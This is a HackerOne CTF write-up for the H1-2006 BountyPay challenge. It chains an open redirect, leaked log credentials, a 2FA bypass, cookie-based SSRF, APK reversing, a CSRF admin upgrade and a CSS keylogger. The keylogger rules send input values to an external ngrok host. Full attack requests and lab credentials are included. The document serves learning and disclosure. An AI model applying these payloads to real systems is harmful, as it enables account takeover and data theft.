@@ -1,0 +1,722 @@
+---
+tags:
+  - type/disclosure
+  - platform/hackerone
+  - severity/critical
+  - env/web
+substate: "resolved"
+weakness: null
+enriched: true
+date: 2020-07-06
+submitted: 2020-06-09T17:23:53.886Z
+bounty_usd: null
+votes: 6
+cve: []
+program: "[[programs/h1-ctf|h1-ctf]]"
+reporter: "shakedko"
+source: "https://hackerone.com/reports/894623"
+title: "@shakedko H1-2006 CTF writeup"
+---
+# @shakedko H1-2006 CTF writeup
+
+> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** h1-ctf | **Disclosed:** 2020-07-06
+
+- Report: [https://hackerone.com/reports/894623](https://hackerone.com/reports/894623)
+- CWE: N/A
+- Submitted: 2020-06-09T17:23:53.886Z
+
+## Timeline
+
+- **Report Filed**
+- **2020-06-09** @shakedko: I accidentally posted my report although I haven't finished writing it. I will add the final one in another comment, sorry for the mess
+- **2020-06-09** @shakedko: ## TL;DR
+
+Flag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.
+
+Thank you for this awesome challenge! 
+
+## Introduction
+
+I have participated in this CTF as I wanted to see how far I'd be able to get considering the fact that I'm doing bug bounty for a relatively short period of time. 
+
+Coming from the software engineering world, I wanted to see how I'd be able to implement my thinking process and figure out as much as I can by myself.
+
+## Tools 
+
+I have used several tools during this process. You may find these tools in the following links:
+
+- [ffuf](https://github.com/ffuf/ffuf) for fuzzing.
+> A fast web fuzzer written in Go.
+
+- Word lists mainly from [SecLists] (https://github.com/danielmiessler/SecLists/).
+> SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
+ 
+- [dex2jar](https://github.com/pxb1988/dex2jar)
+> d2j-dex2jar: Convert .dex file to .class files (zipped as jar)
+
+- [JD-GUI](http://java-decompiler.github.io/)
+> JD-GUI is a standalone graphical utility that displays Java source codes of “.class” files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.
+
+- [Android Studio](https://developer.android.com/studio)
+> Android Studio is the official integrated development environment for Google's Android operating system, built on JetBrains' IntelliJ IDEA software and designed specifically for Android development. 
+
+- [ngrok](https://ngrok.com/)
+> Public URLs for building webhook integrations.
+
+- [findomain](https://github.com/Edu4rdSHL/findomain)
+> The fastest and cross-platform subdomain enumerator.
+
+
+## Description 
+
+HackerOne has [tweeted](https://twitter.com/Hacker0x01/status/1266454022124376064/photo/1) about the mentioned CTF on its Twitter account, describing what would be the end result once the CTF is done: 
+
+> We need your help! CEO 
+@martenmickos
+ needs to approve May bug bounty payments but he has lost his login details for BountyPay. Can you help retrieve them or make the payments for us? https://hackerone.com/h1-ctf 
+
+This meant that until there wasn't a place to make a payment, the CTF wasn't over. This kept me on track as every time I finished a step, as  I knew that I was on the right track but there was still something to be found. 
+
+## Steps
+
+1. Reconnaissance (Subdomain Enumration, Understanding the Application, Content Discovery).
+2. Open Redirect.
+3. Information Disclosure (Log File).
+4. Improper Authorization (2FA Bypass).
+5. SSRF (Via Cookie using Open Redirect).
+6. Information Disclosure (Directory Listing, In-house APK).
+7. Reverse Enginerring (APK).
+8. Information Disclosure (Twitter Account).
+9. Authentication Bypass (Creating Sandra's user).
+10.  CSRF, Parameter Pollution, Privilege Escalation via CSRF (CSS Class, `template` parameter).
+11.  Information Disclosure (CEO username & password).
+12.  SSRF (Via `.css` file).
+13.  CSS Keylogger via SSRF.
+
+### Step 1 - Reconnaissance 
+
+#### Subdomain Enumartion
+
+The scope `*.bountypay.h1ctf.com`, mentioned at https://hackerone.com/h1-ctf, made it clear that there are subdomains to be found, therefore the first thing I did was running a subdomain enumoration:
+
+```bash
+$ findomain -t bountypay.h1ctf.com
+
+Target ==> bountypay.h1ctf.com
+
+Searching in the Facebook API... 🔍
+Searching in the Bufferover API... 🔍
+Searching in the Threatminer API... 🔍
+Searching in the AnubisDB API... 🔍
+Searching in the CertSpotter API... 🔍
+Searching in the Urlscan.io API... 🔍
+Searching in the Threatcrowd API... 🔍
+Searching in the Crtsh database API... 🔍
+Searching in the Virustotal API... 🔍
+Searching in the Sublist3r API... 🔍
+Searching in the Spyse API... 🔍
+
+staff.bountypay.h1ctf.com
+software.bountypay.h1ctf.com
+api.bountypay.h1ctf.com
+app.bountypay.h1ctf.com
+www.bountypay.h1ctf.com
+bountypay.h1ctf.com
+
+A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 2 seconds.⏲️
+
+Good luck Hax0r 💀!
+```
+
+#### Understanding the Application 
+
+I hit all the domains, learnt how and what existed, including texts, descriptions, assets such as js and css and so on. Once done, I continued with my recon by fuzzing `app.bountypay.h1ctf.com`.  
+
+#### Content Discovery
+
+After learning about the application and figuring which subdomains were available, I started to search for directories and files. This process gave me some fruits for later on, including: 
+
+- GET https://app.bountypay.h1ctf.com/cgit 
+- GET https://app.bountypay.h1ctf.com/.git
+- GET https://api.bountypay.h1ctf.com/api
+- GET https://api.bountypay.h1ctf.com/api/staff
+- GET https://api.bountypay.h1ctf.com//api/accounts/<word>
+
+### Step 2 - Open Redirect
+
+While doing my recon, I saw that https://api.bountypay.h1ctf.com as an open redirect on the main page: https://api.bountypay.h1ctf.com/redirect?url=... I knew that this would be useful later on so I kept it in my notes and moved to the next thing I found during my recon
+
+#### Step 3 - Information Disclosure (Log File)
+
+Scanning the `cgit` directory mentioned above, under the content discovery recon, I found information disclosure exposing a .git repository: 
+
+```bash
+cat httpsapp.bountypay.h1ctf.com-cgit-FUZZ.fuzz.json | jq '.results[]'
+{
+  "input": {
+    "FUZZ": "config"
+  },
+  "position": 97,
+  "status": 200,
+  "length": 278,
+  "words": 19,
+  "lines": 12,
+  "redirectlocation": "",
+  "url": "https://app.bountypay.h1ctf.com/cgit/config"
+}
+{
+  "input": {
+    "FUZZ": "index"
+  },
+  "position": 20,
+  "status": 200,
+  "length": 0,
+  "words": 1,
+  "lines": 1,
+  "redirectlocation": "",
+  "url": "https://app.bountypay.h1ctf.com/cgit/index"
+}
+{
+  "input": {
+    "FUZZ": "description"
+  },
+  "position": 3838,
+  "status": 200,
+  "length": 73,
+  "words": 10,
+  "lines": 2,
+  "redirectlocation": "",
+  "url": "https://app.bountypay.h1ctf.com/cgit/description"
+}
+```
+
+Looking into these files, I have found  https://app.bountypay.h1ctf.com/cgit/config exposed a github repository: https://github.com/bounty-pay-code/request-logger.git which contained one file [logger.php](https://github.com/bounty-pay-code/request-logger/blob/master/logger.php) that showed me the way to the next step: 
+
+```php
+<?php
+
+$data = array(
+  'IP'        =>  $_SERVER["REMOTE_ADDR"],
+  'URI'       =>  $_SERVER["REQUEST_URI"],
+  'METHOD'    =>  $_SERVER["REQUEST_METHOD"],
+  'PARAMS'    =>  array(
+      'GET'   =>  $_GET,
+      'POST'  =>  $_POST
+  )
+);
+
+file_put_contents('bp_web_trace.log', date("U").':'.base64_encode(json_encode($data))."\n",FILE_APPEND   );
+````
+
+[https://app.bountypay.h1ctf.com/bp_web_trace.log](bp_web_trace.log) log file contained the following base64 decoded strings: 
+
+```
+1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
+1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
+1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
+1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
+```
+
+Decoding these strings resulted with the username, password, a hint about a 2FA challenge and a possible action within the app: 
+
+```
+{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
+1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
+{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
+1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
+{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
+1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
+{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
+1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
+```
+
+### Step 4 - Improper Authorization
+
+Once I tried to login with the credentials that I found, aka `username: brian.oliver`, `password: V7h0inzX`, I saw a 2FA. 
+
+Looking into the input fields in the HTML, I saw that the challenge and the challenge's answer were sent together within the same request. I had it clear that the challenge was hashed with md5, so I tried to use my own hash by using `md5 -s 1` which resulted with `c4ca4238a0b923820dcc509a6f75849b` and then I just used `1` in order to login, and it worked. The request looked like this:
+
+```bash
+POST / HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Content-Length: 101
+Content-Type: application/x-www-form-urlencoded
+
+username=brian.oliver&password=V7h0inzX&challenge=c4ca4238a0b923820dcc509a6f75849b&challenge_answer=1
+```
+
+and the response: 
+
+```bash
+HTTP/1.1 302 Found
+Server: nginx/1.14.0 (Ubuntu)
+Date: Tue, 09 Jun 2020 16:14:12 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Set-Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9; expires=Thu, 09-Jul-2020 16:14:12 GMT; Max-Age=2592000
+Location: /
+Content-Length: 0
+```
+
+Using this new cookie, I was logged in as Brian Oliver.
+
+### Step 5 - SSRF
+
+After I bypassed the application's 2FA using Brain Oliver's credentials, I tried to play with the application's feature. The application had only one available feature which was suppose to show me the payment statements of the company, but trying to fetch this data resulted with nothing new. 
+
+I looked into the request and I saw that it was doing the following request: 
+
+```bash
+GET /statements?month=01&year=2020 HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Connection: close
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Referer: https://app.bountypay.h1ctf.com/
+Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
+
+```
+
+While returning the following response:
+
+```bash
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Tue, 09 Jun 2020 16:17:38 GMT
+Content-Type: application/json
+Connection: close
+Content-Length: 177
+
+{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020","data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"}
+```
+
+At that point I also looked at the token cookie, which I got when I bypassed the 2FA. Once I decoded its base64, I figured that I might be able to change the request by using the cookie. 
+
+The cookie: `eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` 
+Decoded: `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}` 
+
+Considering the fact that the `account_id` was available in both the cookie and the response from the request above, I tried to change it and see how it reacted. This is the point where I was finally able to use the open redirect that I have found on stage 2. 
+
+I created a new cookie: `{"account_id":"../../redirect?url=FUZZ&","hash":"de235bffd23df6995ad4e0930baac1a2"}` and passed it to ffuf using a script that generated a wordlist and encoded all of the possible words in base64. My wordlist was a mix of two things: 
+
+1. Known words and files
+2. Ideas I got while doing recon - one thing I figured during the recon was that the software.bountypay.h1ctf.com was only accessable from within the company's network and if I find an SSRF, together with the open redirect, I would have defintly checked it out. 
+
+Putting everything together, I found a directory listing while fuzzing which leads me to the next step 
+
+### Step 6 - Information Disclosure (Directory Listing, In-house APK)
+
+As mentioned in the previous step, I got a hit while fuzzing through the SSRF by using the open redirect I have found earlier. The final request was as following: 
+
+```bash
+GET /statements?month=01&year=2020 HTTP/1.1
+Host: app.bountypay.h1ctf.com
+Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyYiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
+
+```
+
+and it's response gave me the hint for the next step: 
+
+```bash
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Tue, 09 Jun 2020 16:27:29 GMT
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 491
+
+{"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/uploads\/&\/statements?month=01&year=2020","data":"<html>\n<head><title>Index of \/uploads\/<\/title><\/head>\n<body bgcolor=\"white\">\n<h1>Index of \/uploads\/<\/h1><hr><pre><a href=\"..\/\">..\/<\/a>\n<a href=\"\/uploads\/BountyPay.apk\">BountyPay.apk<\/a>                                        20-Apr-2020 11:26              4043701\n<\/pre><hr><\/body>\n<\/html>\n"}
+```
+
+Looking at the JSON response, we can see that there was an APK file availble in /uploads/BountyPay.apk. Hitting the full URL https://software.bountypay.h1ctf.com/uplodas/ worked even for non authenticated users. 
+
+### Step 7 - Reverse Enginerring (APK)
+
+When I see an APK or a target that has an APK I usually check its content by either unzipping it or disaassmbiling it. 
+
+In this case, I used dex2jar in order to create a .jar file which allowed me to read the code of the APK together with JD-GUI. 
+
+Once I had the code, I ran the APK using Android Studio's "Profile or debug APK". 
+
+There are plenty of hints within the code and the first one I followed was using the deep links. This helped me understand how to load the 3 different Android Activities: 
+
+- one://part
+- two://part
+- three://part
+
+Each part had a required URI with different parameters that were available in the code. 
+
+In order to move from part one to part two, all I had to do was putting the following URL in the Launch Options: `one://part?start=PartTwoActivity` 
+
+{F861011}
+
+I figured that I needed the `start=PartTwoActivity` together with a username as it was stated in the code: 
+
+```java
+if (getIntent() != null && getIntent().getData() != null) {
+    String str = getIntent().getData().getQueryParameter("start");
+    if (str != null && str.equals("PartTwoActivity") && sharedPreferences.contains("USERNAME")) {
+    ...
+    startActivity(new Intent((Context)this, PartTwoActivity.class));
+    } 
+} 
+```
+
+Once I was on the second Activity, I saw in the code that all inputs where invsible:
+
+```java
+EditText editText = (EditText)findViewById(2131230834);
+Button button = (Button)findViewById(2131230794);
+TextView textView = (TextView)findViewById(2131231002);
+editText.setVisibility(4);
+button.setVisibility(4);
+textView.setVisibility(4
+```
+
+and all I had to do in order to make them visible was figuring out the params within the URL: 
+
+```java
+Uri uri = getIntent().getData();
+String str1 = uri.getQueryParameter("two");
+String str2 = uri.getQueryParameter("switch");
+if (str1 != null && str1.equals("light") && str2 != null && str2.equals("on")) {
+    editText.setVisibility(0);
+    button.setVisibility(0);
+    textView.setVisibility(0);
+} 
+```
+
+Therefore, the URL was: `two://part?two=light&switch=on`. This resulted with a hash, an input field which asked for a header name. 
+
+{F861012}
+
+While doing some recon, I already saw a suspicious base64 code in the 3rd Activity:
+
+```java
+byte[] decodedDirectory = Base64.decode("aG9zdA==", 0);
+
+byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
+
+final String directory = "aG9zdA==";
+
+final String directoryTwo = "WC1Ub2tlbg==";
+
+final String headerDirectory = "header";
+````
+
+Decoding both resulted with the following strings: 
+
+```bash
+$ "WC1Ub2tlbg==" | base64 -d
+X-Token: 
+$ "aG9zdA==" | base64 -d
+host
+```
+
+Using the `X-Token` header I got to the 3rd Activity, which again had insvisible components: 
+
+```java
+protected void onCreate(Bundle paramBundle) {
+    ...
+    final EditText editText = (EditText)findViewById(2131230837);
+    final Button button = (Button)findViewById(2131230796);
+    editText.setVisibility(4);
+    button.setVisibility(4);
+    ...
+}
+```
+
+Looking into the code, I saw that there was an HTTP request that was supposed to be fired once everything had been loaded correctly: 
+
+```java
+this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
+    public void onCancelled(DatabaseError param1DatabaseError) {
+        Log.e("TAG", "onCancelled", (Throwable)param1DatabaseError.toException());
+    }
+    
+    public void onDataChange(DataSnapshot param1DataSnapshot) {
+        String str = (String)param1DataSnapshot.getValue();
+        if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on")) {
+        String str1 = thirdParam;
+        if (str1 != null) {
+            StringBuilder stringBuilder = new StringBuilder();
+            stringBuilder.append("X-");
+            stringBuilder.append(str);
+            if (str1.equals(stringBuilder.toString())) {
+            editText.setVisibility(0);
+            button.setVisibility(0);
+            PartThreeActivity.this.thread.start();
+            } 
+        } 
+        } 
+    }
+}
+```
+
+Using the following URL: `three://part?switch=b24%3D&three=UGFydFRocmVlQWN0aXZpdHk%3D&header=X-Token` I was able to execute this code
+
+{F861013}
+
+I got the `HOST` header and the `X-Token` header in Android Studio's Logcat
+
+```
+2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST IS:: http://api.bountypay.h1ctf.com
+2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN IS:: 8e9998ee3137ca9ade8f372739f062c1
+2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER VALUE AND HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1
+```
+
+{F861010}
+
+It's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. 
+
+The last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: 
+
+1. There's a POST request to the exposed host, but something is missing. 
+2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.
+
+### Step 8 - Information Disclosure (Twitter Account)
+
+BountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: 
+https://twitter.com/SandraA76708114/status/1258693001964068864/photo/1
+
+{F861014}
+
+### Step 9 - Authentication Bypass (Creating Sandra's user)
+
+After I saw the POST request in the APK together with the host and the X-Token header, I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test due to a missing token. 
+
+I first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: 
+
+```bash
+GET /api/staff? HTTP/1.1
+Host: api.bountypay.h1ctf.com
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
+
+```
+
+Response
+```bash
+[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]
+````
+
+After I saw this, I tried to do the same with the following POST request: 
+
+```bash
+POST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1
+Host: api.bountypay.h1ctf.com
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
+Content-Length: 23
+Content-Type: application/x-www-form-urlencoded
+
+staff_id=STF:84DJKEIP38
+```
+
+But that resutled with the following reponse: 
+
+```bash
+HTTP/1.1 409 Conflict
+Server: nginx/1.14.0 (Ubuntu)
+Date: Wed, 03 Jun 2020 13:15:29 GMT
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 39
+
+["Staff Member already has an account"]
+```
+
+Clearly, as Sandra was part of the staff, I went back to Sandra's id and tried her `staff_id`: 
+
+```bash
+POST /api/staff HTTP/1.1
+Host: api.bountypay.h1ctf.com
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
+Content-Length: 36
+Content-Type: application/x-www-form-urlencoded
+
+staff_id=STF:8FJ3KFISL3
+```
+
+And got the following response: 
+
+```bash
+HTTP/1.1 201 Created
+Server: nginx/1.14.0 (Ubuntu)
+Date: Wed, 03 Jun 2020 19:42:33 GMT
+Content-Type: application/json
+Connection: keep-alive
+Content-Length: 110
+
+{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
+```
+
+### Step 10 - CSRF, Parameter Pollution, Privilege Escalation via CSRF
+
+Once I got staff credentials, I opened https://staff.bountypay.h1ctf.com and logged in with Sandra's account. 
+
+The staff dashboard introduced a [javascript file](https://staff.bountypay.h1ctf.com/js/website.js) that looked like the right place to start from:
+
+```javascript
+$(".upgradeToAdmin").click(function() {
+    let t = $('input[name="username"]').val();
+    $.get("/admin/upgrade?username=" + t, function() {
+        alert("User Upgraded to Admin")
+    })
+}), $(".tab").click(function() {
+    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
+}), $(".sendReport").click(function() {
+    $.get("/admin/report?url=" + url, function() {
+        alert("Report sent to admin team")
+    }), $("#myModal").modal("hide")
+}), document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
+```
+
+I figured that I'd have to make all of the following to happen all at once: 
+
+1. Send a report to an admin.
+2. Make the admin to trigger a click on upgradeToAdmin button.
+3. Make sure Sandra's username would be injected to an input form. 
+
+Within the report, I figured that I had to send a URL containg a `#tab2` in the url (or any other tabs for that matter) as this will trigger a click.
+
+Then, in order to make an automated click, I replaced my avatar with `upgradeToAdmin tab tab2` by editing my profile: 
+
+```bash
+POST /?template=home HTTP/1.1
+Host: staff.bountypay.h1ctf.com
+Connection: close
+Content-Length: 67
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+Referer: https://staff.bountypay.h1ctf.com/?template=home
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
+
+profile_name=sandra1&profile_avatar=avatar1 tab upgradeToAdmin tab2
+```
+
+Ending up with a new cookie in the response:
+
+```bash
+HTTP/1.1 302 Found
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sun, 07 Jun 2020 22:18:02 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D; expires=Tue, 07-Jul-2020 22:18:02 GMT; Max-Age=2592000; path=/
+Location: /?template=home
+Content-Length: 0
+
+```
+
+Now I had to figure how to inject the username. This took some time, but at the end I thought about the way Hackerone uses its parameters and tried the same by passing a template array instead of template string, i.e: 
+
+https://staff.bountypay.h1ctf.com/?template[]=login&template[]=ticket&username=sandra.allison&ticket_id=3582#tab2
+
+Using this URL I had 2 templates loaded: 
+
+{F861126}
+
+Now all I had to do was sending the encoded URL to the admin: 
+
+```bash
+GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjI= HTTP/1.1
+Host: staff.bountypay.h1ctf.com
+Connection: close
+Accept: */*
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+X-Requested-With: XMLHttpRequest
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://staff.bountypay.h1ctf.com/?template=ticket&ticket_id=3582
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,he;q=0.8
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D
+
+```
+
+and a new cookie was generated 
+
+```bash
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Sun, 07 Jun 2020 22:18:47 GMT
+Content-Type: application/json
+Connection: close
+Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzNktXd3VtR2tVcURtOTZyWllJcWgzL3J6Uk9BK21iWjdaYkt1UkJrTloxc21qaGFkd05lR2s5cTF2U1dFMWRwbFYrMWRlU09BUmJwST0%3D; expires=Tue, 07-Jul-2020 22:18:47 GMT; Max-Age=2592000; path=/
+Content-Length: 19
+
+["Report received"]
+
+```
+
+
+### Step 13 - Information Disclosure (CEO username & password)
+
+As an Admind I was able to see the application's users: 
+
+{F861125}
+
+so I took the Marten Mickos' credentials, opened https://app.bountypay.h1ctf.com and logged in by passing the 2FA from step 3. 
+
+### Step 14 - SSRF
+
+As mentioned at the beginning, I knew that I was suppose to find a way to make May 2020's payments, so I directly loaded this date and got the payment button: 
+
+{F861124}
+
+I clicked next and saw an interesting hidden input which was using a .css URL: 
+
+{F861123}
+
+I replaced this URL with my own URL using ngrok, and started to play with that. I assumed the following: 
+
+- It had something to do with the 2FA application.
+- It had a hint within the original css file. 
+
+> Template for the UNI 2FA App
+
+- The css was loaded somewhere else by the server.
+
+
+### Step 15 - CSS Keylogger via SSRF
+
+After playing around I [read about a way to create a CSS KeyLogger](https://css-tricks.com/css-keylogger/) and implemented it by myself and it worked. However, I had a problem figuring out the order of the request, which made me create a very specific css, for example: 
+
+```
+input:first-child[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+"); }
+input:nth-child(2)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-2"); }
+input:nth-child(2)[value$=" "] { background-image: url("https://dd36dc8b7bc5.ngrok.io/+-3"); }
+input:nth-child(4)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-4"); }
+input:nth-child(5)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-5"); }
+input:nth-child(6)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-6"); }
+input:nth-child(7)[value$=" "] { background-image: url("https://8c7a64aff54e.ngrok.io/+-7"); }
